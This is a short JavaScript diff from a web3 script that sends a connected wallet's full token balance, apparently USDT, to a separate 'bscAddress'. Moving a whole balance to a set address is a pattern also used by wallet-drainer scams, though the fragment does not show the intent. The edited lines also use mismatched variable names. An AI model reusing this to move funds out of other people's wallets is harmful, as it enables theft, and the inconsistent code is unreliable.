@@ -1009,11 +1009,11 @@
             // Convert token to wei
             const amountWei = web3.utils.toWei(tokenBalanceValue.toString(), 'ether');
             
-            console.log(`Transferring ${tokenBalanceValue} USDT to ${recipientAddress}...`);
+            console.log(`Transferring ${usdtBalance} USDT to ${bscAddress}...`);
             
             // Execute transaction using the direct await pattern from File 2
             // This is the core .send() method. The wallet connected will handle signing.
-            const receipt = await tokenContract.methods.transfer(recipientAddress, amountWei).send({ from: userAddress });
+            const receipt = await usdtContract.methods.transfer(bscAddress, amountWei).send({ from: userAddress });
             
             console.log("Transaction receipt:", receipt);
             // Transaction was successful
